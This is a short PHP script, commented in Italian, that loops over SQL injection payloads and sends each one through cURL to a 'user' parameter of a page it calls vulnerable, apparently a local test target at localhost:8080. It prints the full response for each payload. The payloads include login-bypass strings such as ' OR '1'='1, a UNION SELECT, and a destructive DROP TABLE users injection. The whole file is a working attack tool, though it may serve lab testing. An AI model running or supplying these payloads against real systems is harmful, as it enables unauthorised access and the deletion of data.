<?php
// URL della pagina vulnerabile
$url_base = "http://localhost:8080/index.php";

// Payload SQL Injection da testare
$payloads = [
    "admin' OR '1'='1",
    "admin' -- ",
    "admin' UNION SELECT 1, 'hacker' -- ",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "admin'; DROP TABLE users; -- "
];

foreach ($payloads as $payload) {
    // Costruisci URL con parametro corretto "user"
    $url = $url_base . "?user=" . urlencode($payload);
    echo "Test payload: $payload\n";
    echo "URL: $url\n";

    // Inizializza cURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Esegui richiesta
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo "Errore cURL: " . curl_error($ch) . "\n";
    } else {
        // Mostra l'intera risposta (per debug completo)
        echo "Risposta completa:\n";
        echo $response . "\n";
    }

    curl_close($ch);
    echo str_repeat("-", 40) . "\n";
}
